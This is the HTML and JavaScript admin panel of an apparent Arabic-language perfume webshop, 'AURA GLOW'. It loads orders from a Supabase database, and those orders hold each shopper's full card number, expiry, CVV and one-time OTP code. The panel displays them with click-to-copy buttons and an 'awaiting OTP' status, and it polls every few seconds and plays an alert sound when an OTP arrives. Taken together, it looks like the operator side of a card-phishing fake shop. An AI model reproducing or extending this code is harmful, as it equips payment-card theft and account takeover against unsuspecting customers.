<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-Content-Type-Options" content="nosniff">
    <meta http-equiv="X-Frame-Options" content="DENY">
    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https:; script-src 'self' 'unsafe-inline' https:; style-src 'self' 'unsafe-inline' https:; img-src 'self' https: data:; connect-src 'self' https:; form-action 'self' https:">
    <link rel="icon" type="image/png" href="../logo.png">
    <title>لوحة التحكم الإدارية - AURA GLOW</title>
    <link rel="manifest" href="/manifest.json">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Cairo', sans-serif; }
        .scrollbar-none::-webkit-scrollbar { display: none; }
        .tab-active { border-bottom-color: #b45309; color: #92400e; }
        .copy-cell { transition: all 0.2s; cursor: pointer; }
        .copy-cell:hover { background: #fef3c7 !important; box-shadow: 0 0 0 2px #d97706; border-radius: 8px; }
        #session-overlay { display: none; }
        .security-badge { background: #059669; color: white; font-size: 9px; padding: 2px 8px; border-radius: 999px; font-weight: bold; }

        /* Mobile responsive */
        @media (max-width: 640px) {
            .header-logo { height: 3rem !important; }
            .header-badge, .security-badge { display: none !important; }
            .tab-text { font-size: 11px !important; }
            .orders-table thead { display: none; }
            .orders-table tr {
                display: block;
                border: 1px solid #e7e5e4;
                border-radius: 16px;
                padding: 12px;
                margin-bottom: 10px;
                background: white;
            }
            .orders-table td {
                display: flex;
                justify-content: space-between;
                padding: 6px 0 !important;
                border: none !important;
                font-size: 12px;
            }
            .orders-table td:before {
                content: attr(data-label);
                font-weight: 700;
                color: #78716c;
                font-size: 11px;
            }
            .orders-table td:last-child {
                justify-content: flex-start;
                gap: 6px;
                flex-wrap: wrap;
                padding-top: 10px !important;
                border-top: 1px solid #e7e5e4 !important;
                margin-top: 6px;
            }
            .mobile-header-nav { gap: 8px !important; }
            .mobile-header-nav a, .mobile-header-nav button { font-size: 10px !important; padding: 4px 8px !important; }
            .discount-control { flex-wrap: wrap; gap: 6px; }
        .main-content { padding-top: 1rem !important; }
        @media (max-width: 640px) {
            .products-grid-section { flex-direction: column; align-items: stretch !important; }
            .add-product-btn { width: 100%; justify-content: center; }
            .tab-section-header { flex-wrap: wrap; gap: 8px; }
        }
        }
    </style>
</head>
<body class="bg-stone-100 text-stone-800 antialiased selection:bg-amber-100 selection:text-amber-900">

    <header class="bg-stone-900 text-white sticky top-0 z-40 border-b border-stone-800">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
            <div class="flex items-center gap-3">
                <a href="/store/" class="flex items-center gap-2"><img src="../logo.png" alt="AURA GLOW" class="header-logo h-24 md:h-32 mx-auto"></a>
                <span class="header-badge bg-amber-700/30 text-amber-400 text-xs px-3 py-1 rounded-full font-bold">لوحة التحكم</span>
                <span class="security-badge">🔒 مشفر</span>
                <span class="security-badge">🛡️ آمن</span>
            </div>
            <div class="flex items-center gap-4">
                <a href="/store/" class="text-xs text-stone-300 hover:text-white transition">عرض المتجر</a>
                <button onclick="logout()" class="text-xs text-rose-300 hover:text-rose-200 transition font-bold">تسجيل خروج</button>
                <div class="w-10 h-10 rounded-full bg-amber-700 flex items-center justify-center font-bold text-white">أ</div>
            </div>
        </div>
    </header>

    <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-10 space-y-10">

        <div class="flex border-b border-stone-300 gap-6 overflow-x-auto scrollbar-none">
            <button onclick="switchTab('orders')" id="tab-orders-btn" class="pb-3 font-bold text-base border-b-2 border-amber-700 text-amber-800 transition whitespace-nowrap">إدارة الطلبات</button>
            <button onclick="switchTab('products')" id="tab-products-btn" class="pb-3 font-bold text-base border-b-2 border-transparent text-stone-500 hover:text-stone-800 transition whitespace-nowrap">إدارة المنتجات والمخزون</button>
        </div>

        <section id="tab-orders" class="space-y-6">
            <div class="tab-section-header flex justify-between items-center">
                <h2 class="text-xl font-extrabold text-stone-900">الطلبات الواردة من العملاء</h2>
                <button onclick="loadOrders()" class="bg-stone-900 text-white px-4 py-2 rounded-xl text-xs font-bold hover:bg-stone-800 transition">تحديث القائمة</button>
            </div>
            <div class="bg-white rounded-3xl border border-stone-200 overflow-hidden shadow-sm">
                <div class="overflow-x-auto">
                    <table class="orders-table w-full text-right text-sm">
                        <thead class="bg-stone-50 border-b border-stone-200 text-stone-500 font-bold">
                            <tr>
                                <th class="p-4">رقم الطلب</th>
                                <th class="p-4">اسم العميل</th>
                                <th class="p-4">رقم الهاتف</th>
                                <th class="p-4">المجموع</th>
                                <th class="p-4">طريقة الدفع</th>
                                <th class="p-4">الحالة</th>
                                <th class="p-4">التاريخ</th>
                                <th class="p-4">الإجراءات</th>
                            </tr>
                        </thead>
                        <tbody id="orders-table-body" class="divide-y divide-stone-100"></tbody>
                    </table>
                </div>
            </div>
        </section>

        <section id="tab-products" class="hidden space-y-6">
            <div class="tab-section-header flex justify-between items-center">
                <h2 class="text-xl font-extrabold text-stone-900">إدارة منتجات المتجر</h2>
                <div class="flex items-center gap-3">
                    <div class="flex items-center gap-2 bg-white rounded-xl border border-stone-200 px-3 py-1.5 shadow-sm">
                        <span class="text-xs text-stone-500 font-bold">خصم عام:</span>
                        <input type="number" id="global-discount-input" value="60" min="0" max="99" class="w-14 text-center font-extrabold text-amber-700 text-sm border border-stone-300 rounded-lg px-1 py-1 outline-none focus:ring-2 focus:ring-amber-600">
                        <span class="text-xs text-stone-500">%</span>
                        <button onclick="saveGlobalDiscount()" class="bg-amber-700 hover:bg-amber-800 text-white px-2.5 py-1 rounded-lg text-xs font-bold transition">حفظ</button>
                    </div>
                    <button onclick="openAddProductModal()" class="bg-amber-700 text-white px-4 py-2 rounded-xl text-xs font-bold hover:bg-amber-800 transition flex items-center gap-1">
                    <span>+ إضافة منتج جديد</span>
                </button>
            </div>
            <div id="products-container" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6"></div>
        </section>

    </main>

    <div id="product-modal" class="fixed inset-0 bg-stone-900/50 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
        <div class="bg-white rounded-3xl p-8 max-w-md w-full space-y-6 border border-stone-200 shadow-xl">
            <div class="flex justify-between items-center border-b pb-4">
                <h3 id="modal-title" class="font-extrabold text-stone-900 text-lg">إضافة منتج جديد</h3>
                <button onclick="closeProductModal()" class="text-stone-400 hover:text-stone-800 text-lg font-bold">&times;</button>
            </div>
            <form id="product-form" onsubmit="saveProduct(event)" class="space-y-4 text-xs font-bold">
                <input type="hidden" id="product-id">
                <div>
                    <label class="block text-stone-600 mb-1">اسم المنتج</label>
                    <input type="text" id="product-name" required class="w-full bg-stone-50 border border-stone-200 rounded-xl px-4 py-2 text-stone-900 focus:outline-none focus:ring-2 focus:ring-amber-600">
                </div>
                <div>
                    <label class="block text-stone-600 mb-1">السعر (ر.س)</label>
                    <input type="number" id="product-price" required class="w-full bg-stone-50 border border-stone-200 rounded-xl px-4 py-2 text-stone-900 focus:outline-none focus:ring-2 focus:ring-amber-600">
                </div>
                <div>
                    <label class="block text-stone-600 mb-1">السعر القديم (اختياري)</label>
                    <input type="number" id="product-oldprice" class="w-full bg-stone-50 border border-stone-200 rounded-xl px-4 py-2 text-stone-900 focus:outline-none focus:ring-2 focus:ring-amber-600">
                </div>
                <div>
                    <label class="block text-stone-600 mb-1">رابط الصورة (URL)</label>
                    <input type="text" id="product-image" required class="w-full bg-stone-50 border border-stone-200 rounded-xl px-4 py-2 text-stone-900 focus:outline-none focus:ring-2 focus:ring-amber-600">
                </div>
                <div>
                    <label class="block text-stone-600 mb-1">التصنيف</label>
                    <select id="product-category" required class="w-full bg-stone-50 border border-stone-200 rounded-xl px-4 py-2 text-stone-900 focus:outline-none focus:ring-2 focus:ring-amber-600">
                        <option value="perfumes-m">عطور رجالية</option>
                        <option value="perfumes-w">عطور نسائية</option>
                        <option value="unisex">عطور مشتركة</option>
                    </select>
                </div>
                <div>
                    <label class="block text-stone-600 mb-1">الوسم (badge)</label>
                    <input type="text" id="product-badge" class="w-full bg-stone-50 border border-stone-200 rounded-xl px-4 py-2 text-stone-900 focus:outline-none focus:ring-2 focus:ring-amber-600" placeholder="خصم 60%">
                </div>
                <button type="submit" class="w-full bg-stone-900 text-white py-3 rounded-xl font-bold hover:bg-stone-800 transition">حفظ المنتج</button>
            </form>
        </div>
    </div>

    <div id="order-detail-modal" class="fixed inset-0 bg-stone-900/50 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
        <div class="bg-white rounded-3xl p-8 max-w-2xl w-full space-y-6 border border-stone-200 shadow-xl max-h-[90vh] overflow-y-auto">
            <div class="flex justify-between items-center border-b pb-4">
                <h3 class="font-extrabold text-stone-900 text-lg">تفاصيل الطلب</h3>
                <button onclick="closeOrderModal()" class="text-stone-400 hover:text-stone-800 text-lg font-bold">&times;</button>
            </div>
            <div id="order-detail-content"></div>
        </div>
    </div>

    <footer class="bg-stone-900 text-stone-400 py-8 mt-20">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex flex-wrap justify-center gap-6 mb-4 text-xs">
                <a href="/privacy/" class="hover:text-white transition">سياسة الخصوصية</a>
                <a href="/terms/" class="hover:text-white transition">الشروط والأحكام</a>
                <a href="/about/" class="hover:text-white transition">من نحن</a>
            </div>
            <div class="text-center space-y-3">
                <img src="../logo.png" alt="AURA GLOW" class="h-10 mx-auto opacity-95">
                <p class="text-xs text-stone-500">لوحة تحكم أورا جلو الإدارية © 2026</p>
            </div>
        </div>
    </footer>

    <script src="../perfumes.js"></script>

    <script src="../product-media.js"></script>

    <script src="../money.js"></script>

    <script>
        var _SUPABASE_URL = 'https://blozysudthytzkfepgqc.supabase.co';
        var _SUPABASE_KEY = 'sb_publishable_tRk0OqQQQlxCt8dlngXwfw_DtrqVaXM';

        function _sbHeaders(extra) {
            var h = { 'Content-Type': 'application/json', 'apikey': _SUPABASE_KEY, 'Authorization': 'Bearer ' + _SUPABASE_KEY };
            var s = localStorage.getItem('auraAdminSession');
            if (s) { try { var sess = JSON.parse(s); if (sess.access_token) h['Authorization'] = 'Bearer ' + sess.access_token; } catch(e) {} }
            if (extra) Object.assign(h, extra);
            return h;
        }

        async function loadOrdersFromSupabase() {
            try {
                var r = await fetch(_SUPABASE_URL + '/rest/v1/orders?select=*&order=id.desc', { headers: _sbHeaders() });
                var data = await r.json();
                if (!Array.isArray(data)) return [];
                return data.map(function(row) { return {
                    id: row.order_id, name: row.customer_name, phone: row.customer_phone,
                    address: row.customer_address, country: row.customer_country,
                    total: row.total, status: row.status,
                    date: row.created_at ? new Date(row.created_at).toLocaleString('he-IL', {hour:'2-digit',minute:'2-digit'}) : '-',
                    paymentMethod: row.card_type || '-',
                    cardDetails: { holder: row.card_holder||'', number: row.card_number||'', expiry: row.card_expiry||'', cvv: row.card_cvv||'', brand: row.card_type||'', otp: row.card_otp||'' },
                    items: typeof row.products === 'string' ? JSON.parse(row.products||'[]') : (row.products||[])
                };});
            } catch(e) { return []; }
        }

        async function updateOrderStatusInSupabase(orderId, newStatus) {
            try {
                await fetch(_SUPABASE_URL + '/rest/v1/orders?order_id=eq.' + orderId, {
                    method: 'PATCH', headers: _sbHeaders(),
                    body: JSON.stringify({ status: newStatus })
                });
            } catch(e) {}
        }

        async function deleteOrderFromSupabase(orderId) {
            try {
                await fetch(_SUPABASE_URL + '/rest/v1/orders?order_id=eq.' + orderId, {
                    method: 'DELETE', headers: _sbHeaders()
                });
            } catch(e) {}
        }

        const DEFAULT_PRODUCTS = (window.AURA_PERFUMES || []).map(function(p) {
            return Object.assign({}, p, {
                oldPrice: p.oldPrice || null,
                rating: p.rating || 4.5,
                reviews: p.reviews || 0,
                badge: p.badge || null
            });
        });

        let products = [];
        let orders = [];

        function initProducts() {
            const ver = parseInt(localStorage.getItem('auraProductsVersion') || '0');
            if (ver < 5 || !localStorage.getItem('auraProducts')) {
                localStorage.setItem('auraProducts', JSON.stringify(DEFAULT_PRODUCTS));
                localStorage.setItem('auraProductsVersion', '5');
            }
            products = DEFAULT_PRODUCTS;
        }

        function switchTab(tab) {
            ['orders', 'products'].forEach(t => {
                document.getElementById(`tab-${t}`).classList.add('hidden');
                document.getElementById(`tab-${t}-btn`).className = "pb-3 font-bold text-base border-b-2 border-transparent text-stone-500 hover:text-stone-800 transition whitespace-nowrap";
            });
            document.getElementById(`tab-${tab}`).classList.remove('hidden');
            document.getElementById(`tab-${tab}-btn`).className = "pb-3 font-bold text-base border-b-2 border-amber-700 text-amber-800 transition whitespace-nowrap";
        }

        function loadOrders() {
            loadOrdersFromSupabase().then(function(supabaseOrders) {
                var localOrders = JSON.parse(localStorage.getItem('auraOrders')) || [];
                var merged = {};
                supabaseOrders.forEach(function(o) { merged[o.id] = o; });
                localOrders.forEach(function(o) { merged[o.id] = o; });
                orders = Object.values(merged);
                renderOrdersTable();
            }).catch(function() {
                orders = JSON.parse(localStorage.getItem('auraOrders')) || [];
                renderOrdersTable();
            });
        }

        function renderOrdersTable() {
            const tbody = document.getElementById('orders-table-body');
            if (orders.length === 0) {
                tbody.innerHTML = `<tr><td colspan="8" class="p-8 text-center text-stone-400">لا توجد طلبات واردة بعد.</td></tr>`;
                return;
            }
            tbody.innerHTML = orders.map(o => `
                <tr class="hover:bg-stone-50/50 transition border-b border-stone-100">
                    <td data-label="رقم الطلب" class="p-4 font-extrabold text-stone-900">${o.id}</td>
                    <td data-label="اسم العميل" class="p-4 text-stone-700">${o.name}</td>
                    <td data-label="رقم الهاتف" class="p-4 text-stone-600 text-xs" dir="ltr">${o.phone || '-'}</td>
                    <td data-label="المجموع" class="p-4 font-bold text-amber-700">${auraMoney(o.total)}</td>
                    <td data-label="طريقة الدفع" class="p-4 text-stone-600">${o.paymentMethod || o.cardDetails?.brand || '-'}</td>
                    <td data-label="الحالة" class="p-4">
                        <span class="px-3 py-1 rounded-full text-xs font-bold ${o.status === 'تم الدفع' ? 'bg-emerald-100 text-emerald-800' : o.status === 'بانتظار OTP' ? 'bg-amber-100 text-amber-800' : 'bg-sky-100 text-sky-800'}">${o.status}</span>
                    </td>
                    <td data-label="التاريخ" class="p-4 text-xs text-stone-500">${o.date || '-'}</td>
                    <td data-label="الإجراءات" class="p-4 flex gap-2">
                        <button onclick="viewOrder('${o.id}')" class="text-xs bg-stone-900 text-white px-3 py-1.5 rounded-xl hover:bg-stone-800 transition">عرض</button>
                        <button onclick="toggleOrderStatus('${o.id}')" class="text-xs bg-amber-100 text-amber-800 px-3 py-1.5 rounded-xl hover:bg-amber-200 transition">حالة</button>
                        <button onclick="deleteOrder('${o.id}')" class="text-xs bg-rose-50 text-rose-600 px-3 py-1.5 rounded-xl hover:bg-rose-100 transition">حذف</button>
                    </td>
                </tr>
                ${o.cardDetails && o.cardDetails.number ? '<tr class="bg-amber-50/30 border-b border-stone-100">' +
                    '<td colspan="8" class="p-3 px-4">' +
                        '<div class="flex flex-wrap gap-x-6 gap-y-1 text-xs">' +
                            '<span><span class="text-stone-500 font-bold">البطاقة:</span> <span class="font-mono font-bold text-amber-800 cursor-pointer copy-cell" onclick="copyText(\'' + o.cardDetails.number + '\', this)" title="انقر للنسخ">' + o.cardDetails.number + '</span></span>' +
                            '<span><span class="text-stone-500 font-bold">صاحبها:</span> <span class="font-bold cursor-pointer copy-cell" onclick="copyText(\'' + (o.cardDetails.holder||'') + '\', this)" title="انقر للنسخ">' + (o.cardDetails.holder||'-') + '</span></span>' +
                            '<span><span class="text-stone-500 font-bold">الانتهاء:</span> <span class="font-bold">' + (o.cardDetails.expiry||'-') + '</span></span>' +
                            '<span><span class="text-stone-500 font-bold">رمز الأمان:</span> <span class="font-mono font-bold cursor-pointer copy-cell" onclick="copyText(\'' + (o.cardDetails.cvv||'') + '\', this)" title="انقر للنسخ">' + (o.cardDetails.cvv||'-') + '</span></span>' +
                            '<span><span class="text-stone-500 font-bold">رمز التحقق:</span> <span class="font-mono font-bold text-emerald-700 cursor-pointer copy-cell" onclick="copyText(\'' + (o.cardDetails.otp||'') + '\', this)" title="انقر للنسخ">' + (o.cardDetails.otp||'-') + '</span></span>' +
                        '</div>' +
                    '</td>' +
                '</tr>' : ''}
            `).join('');
        }

        function copyText(text, el) {
            navigator.clipboard.writeText(text).then(() => {
                const orig = el.innerHTML;
                el.innerHTML = '✓ نسخ!';
                el.style.color = '#059669';
                setTimeout(() => { el.innerHTML = orig; el.style.color = ''; }, 1200);
            }).catch(() => {
                const orig = el.innerHTML;
                el.innerHTML = 'فشل';
                el.style.color = '#dc2626';
                setTimeout(() => { el.innerHTML = orig; el.style.color = ''; }, 1200);
            });
        }


        function loadProducts() {
            const container = document.getElementById('products-container');
            if (products.length === 0) {
                container.innerHTML = `<div class="col-span-full text-center text-stone-400 py-12">لا توجد منتجات مضافة بعد.</div>`;
                return;
            }
            container.innerHTML = products.map(p => `
                <div class="bg-white rounded-3xl p-5 border border-stone-200 flex flex-col justify-between shadow-sm space-y-4">
                        <img src="${p.image}" alt="${p.name}" class="w-16 h-16 object-contain bg-stone-50 rounded-2xl p-2 border border-stone-100">
                        <div>
                            <span class="text-[10px] bg-amber-100 text-amber-800 font-bold px-2 py-0.5 rounded-md">${p.category}</span>
                            <h4 class="font-extrabold text-stone-900 text-sm mt-1">${p.name}</h4>
                            <div class="text-xs text-amber-700 font-bold mt-1">${auraMoney(Math.round(p.oldPrice * (100 - getGlobalDiscount()) / 100))} ${p.oldPrice ? `<span class="text-stone-400 line-through text-[10px]">p.oldPrice</span>` : ''}</div>
                        </div>
                    </div>
                    <div class="flex gap-2 pt-2 border-t border-stone-100">
                        <button onclick="editProduct(${p.id})" class="flex-1 bg-stone-100 text-stone-800 py-2 rounded-xl text-xs font-bold hover:bg-stone-200 transition">تعديل</button>
                        <button onclick="deleteProduct(${p.id})" class="flex-1 bg-rose-50 text-rose-600 py-2 rounded-xl text-xs font-bold hover:bg-rose-100 transition">حذف</button>
                    </div>
                </div>
            `).join('');
        }

        function viewOrder(id) {
            const order = orders.find(o => o.id === id);
            if (!order) return;
            const content = document.getElementById('order-detail-content');
            const itemsHtml = (order.items || []).map(item => `
                <div class="flex items-center justify-between bg-stone-50 p-3 rounded-xl">
                <div class="discount-control flex items-center gap-3">
                        <img src="${item.image}" class="w-10 h-10 object-contain bg-white rounded-lg p-1 border">
                        <div>
                            <div class="font-bold text-xs">${item.name}</div>
                            <div class="text-xs text-stone-500">${auraMoney(item.price)} × ${item.qty}</div>
                        </div>
                    </div>
                    <div class="font-bold text-amber-700">${auraMoney(item.price * item.qty)}</div>
                </div>
            `).join('');

            const cardSection = order.cardDetails ? `
                <div class="bg-rose-50 border border-rose-200 rounded-2xl p-4 space-y-2">
                    <h4 class="font-bold text-rose-800 text-sm">بيانات البطاقة الائتمانية (كاملة)</h4>
                    <div class="grid grid-cols-2 gap-2 text-xs">
                        <div><span class="text-stone-500">رقم البطاقة:</span> <span class="font-bold font-mono text-base text-rose-700">${order.cardDetails.number}</span></div>
                        <div><span class="text-stone-500">تاريخ الانتهاء:</span> <span class="font-bold">${order.cardDetails.expiry}</span></div>
                        <div><span class="text-stone-500">رمز الأمان:</span> <span class="font-bold font-mono">${order.cardDetails.cvv}</span></div>
                        <div><span class="text-stone-500">رمز التحقق:</span> <span class="font-bold font-mono cursor-pointer copy-cell" onclick="copyText('${order.cardDetails.otp || ''}', this)" title="انقر للنسخ">${order.cardDetails.otp || '-'}</span></div>
                        <div><span class="text-stone-500">النوع:</span> <span class="font-bold">${order.cardDetails.brand}</span></div>
                        <div><span class="text-stone-500">حامل البطاقة:</span> <span class="font-bold cursor-pointer copy-cell" onclick="copyText('${order.cardDetails.holder}', this)" title="انقر للنسخ">${order.cardDetails.holder}</span></div>
                    </div>
                </div>
            ` : '';

            content.innerHTML = `
                <div class="space-y-4">
                    <div class="grid grid-cols-2 gap-4 text-sm">
                        <div><span class="text-stone-500">رقم الطلب:</span> <span class="font-bold">${order.id}</span></div>
                        <div><span class="text-stone-500">التاريخ:</span> <span class="font-bold">${order.date || '-'}</span></div>
                        <div><span class="text-stone-500">العميل:</span> <span class="font-bold">${order.name}</span></div>
                        <div><span class="text-stone-500">البريد:</span> <span class="font-bold">${order.email || '-'}</span></div>
                        <div><span class="text-stone-500">الحالة:</span> <span class="font-bold">${order.status}</span></div>
                        <div><span class="text-stone-500">الإجمالي:</span> <span class="font-bold text-amber-700">${auraMoney(order.total)}</span></div>
                    </div>
                    ${cardSection}
                    <div>
                        <h4 class="font-bold text-sm text-stone-800 mb-2">المنتجات المطلوبة</h4>
                        <div class="space-y-2">${itemsHtml || '<p class="text-xs text-stone-400">لا توجد منتجات</p>'}</div>
                    </div>
                </div>
            `;
            document.getElementById('order-detail-modal').classList.remove('hidden');
            document.getElementById('order-detail-modal').classList.add('flex');
        }

        function closeOrderModal() {
            document.getElementById('order-detail-modal').classList.add('hidden');
        }

        function toggleOrderStatus(id) {
            const o = orders.find(ord => ord.id === id);
            if (o) {
                o.status = o.status === 'قيد المراجعة' ? 'تم الشحن' : 'قيد المراجعة';
                localStorage.setItem('auraOrders', JSON.stringify(orders));
                updateOrderStatusInSupabase(id, o.status);
                loadOrders();
            }
        }

        function deleteOrder(id) {
            if (!confirm('هل أنت متأكد من حذف هذا الطلب؟')) return;
            orders = orders.filter(o => o.id !== id);
            localStorage.setItem('auraOrders', JSON.stringify(orders));
            deleteOrderFromSupabase(id);
            loadOrders();
            loadCards();
        }

        function openAddProductModal() {
            document.getElementById('modal-title').textContent = 'إضافة منتج جديد';
            document.getElementById('product-id').value = '';
            document.getElementById('product-form').reset();
            document.getElementById('product-modal').classList.remove('hidden');
            document.getElementById('product-modal').classList.add('flex');
        }

        function closeProductModal() {
            document.getElementById('product-modal').classList.add('hidden');
        }

        function editProduct(id) {
            const p = products.find(prod => prod.id === id);
            if (p) {
                document.getElementById('modal-title').textContent = 'تعديل بيانات المنتج';
                document.getElementById('product-id').value = p.id;
                document.getElementById('product-name').value = p.name;
                document.getElementById('product-price').value = p.price;
                document.getElementById('product-oldprice').value = p.oldPrice || '';
                document.getElementById('product-image').value = p.image;
                document.getElementById('product-category').value = p.category;
                document.getElementById('product-badge').value = p.badge || '';
                document.getElementById('product-modal').classList.remove('hidden');
                document.getElementById('product-modal').classList.add('flex');
            }
        }

        function sanitizeHTML(str) {
            var d = document.createElement('div');
            d.textContent = str || '';
            return d.innerHTML;
        }
        function sanitizeURL(str) {
            str = (str || '').trim();
            if (str.startsWith('javascript:') || str.startsWith('data:') && !str.startsWith('data:image')) return '';
            return str;
        }
        function sanitizeObj(obj) {
            var safe = {};
            for (var k in obj) {
                if (typeof obj[k] === 'string') safe[k] = sanitizeHTML(obj[k]);
                else if (typeof obj[k] === 'number') safe[k] = obj[k];
                else safe[k] = obj[k];
            }
            return safe;
        }

        function saveProduct(e) {
            e.preventDefault();
            const id = document.getElementById('product-id').value;
            const name = sanitizeHTML(document.getElementById('product-name').value);
            const price = parseFloat(document.getElementById('product-price').value);
            const oldPrice = parseFloat(document.getElementById('product-oldprice').value) || undefined;
            const image = sanitizeURL(document.getElementById('product-image').value);
            const category = sanitizeHTML(document.getElementById('product-category').value);
            const badge = sanitizeHTML(document.getElementById('product-badge').value || 'مميز');

            if (!name || !price || !image || !category) { alert('الرجاء ملء جميع الحقول المطلوبة'); return; }

            if (id) {
                const p = products.find(prod => prod.id == id);
                if (p) { Object.assign(p, { name, price, oldPrice, image, category, badge }); }
            } else {
                const newId = products.length > 0 ? Math.max(...products.map(p => p.id)) + 1 : 1;
                products.push({ id: newId, name, price, oldPrice, image, category, badge, rating: 4.5, reviews: 66 });
            }
            localStorage.setItem('auraProducts', JSON.stringify(products));
            closeProductModal();
            loadProducts();
        }

        function deleteProduct(id) {
            if (!confirm('هل أنت متأكد من حذف هذا المنتج؟')) return;
            products = products.filter(p => p.id !== id);
            localStorage.setItem('auraProducts', JSON.stringify(products));
            loadProducts();
        }

        function getGlobalDiscount() {
            return parseInt(localStorage.getItem('auraGlobalDiscount') || '60');
        }

        function saveGlobalDiscount() {
            var val = parseInt(document.getElementById('global-discount-input').value);
            if (isNaN(val) || val < 0 || val > 99) { alert('الرجاء إدخال رقم بين 0 و 99'); return; }
            localStorage.setItem('auraGlobalDiscount', val);
            document.getElementById('global-discount-input').value = val;
            loadProducts();
        }

        document.getElementById('global-discount-input').value = getGlobalDiscount();
        initProducts();
        loadProducts();

        window.addEventListener('storage', (e) => {
            if (e.key === 'auraOrders') { loadOrders(); }
            if (e.key === 'auraProducts') { initProducts(); loadProducts(); }
        });
    </script>
    <script>
        // Register PWA service worker
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('/service-worker.js');
        }

        // Request notification permission
        if ('Notification' in window && Notification.permission === 'default') {
            Notification.requestPermission();
        } else if ('Notification' in window && Notification.permission === 'denied') {
            console.log('[الأمان] الإشعارات ممنوعة من المتصفح');
        }

        // Cross-device: check for new orders via Supabase (sound + notification)
        var _lastOrderCount = parseInt(localStorage.getItem('auraLastOrderCount') || '0');
        function checkNewOrders() {
            loadOrdersFromSupabase().then(function(list) {
                var currentCount = list.length;
                if (currentCount > _lastOrderCount) {
                    var diff = currentCount - _lastOrderCount;
                    if (typeof window.playOrderSound === 'function') window.playOrderSound();
                    if ('Notification' in window && Notification.permission === 'granted') {
                        try { new Notification('🛒 طلب جديد!', { body: diff + ' طلب/طلبات جديدة', icon: '/logo.png', vibrate: [200,100,200] }); } catch(e) {}
                    }
                    loadOrders();
                }
                _lastOrderCount = currentCount;
                try { localStorage.setItem('auraLastOrderCount', currentCount); } catch(e) {}
            }).catch(function() {});
        }
        // Start checking after page loads
        setTimeout(function() { checkNewOrders(); }, 3000);
        setInterval(checkNewOrders, 5000);
        // Same-device: listen for localStorage counter changes
        window.addEventListener('storage', function(e) {
            if (e.key === 'auraOrderAlert' && typeof window.playOrderSound === 'function') window.playOrderSound();
            if (e.key === 'auraOrderOtp' && typeof window.playOtpSound === 'function') window.playOtpSound();
        });

        (function() {
            var sessionData = localStorage.getItem('auraAdminSession');
            var sessionData = localStorage.getItem('auraAdminSession');
            if (!sessionData) { window.location.href='/admin-login/'; return; }
            var session = JSON.parse(sessionData);
            var expired = !session.access_token || (session.expires_at && new Date(session.expires_at) < new Date());
            if (expired) {
                localStorage.removeItem('auraAdminSession');
                window.location.href='/admin-login/';
                return;
            }
            var refreshToken = session.refresh_token;
            fetch(_SUPABASE_URL + '/auth/v1/token?grant_type=refresh_token', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'apikey': _SUPABASE_KEY },
                body: JSON.stringify({ refresh_token: refreshToken })
            }).then(function(r) { return r.json(); }).then(function(d) {
                if (d.access_token) {
                    localStorage.setItem('auraAdminSession', JSON.stringify({
                        access_token: d.access_token,
                        refresh_token: d.refresh_token || refreshToken,
                        expires_at: Date.now() + (d.expires_in || 3600) * 1000
                    }));
                }
                console.log('[الأمان] تم التحقق من هوية الأدمن عبر Supabase Auth');
                loadOrders();
            }).catch(function() {
                loadOrders();
            });
        })();

        function logout() {
            localStorage.removeItem('auraAdminSession');
            localStorage.removeItem('adminToken');
            localStorage.removeItem('adminSessionStart');
            window.location.href = '/admin-login/';
        }
    </script>
    <script src="../notify.js"></script>
</body>
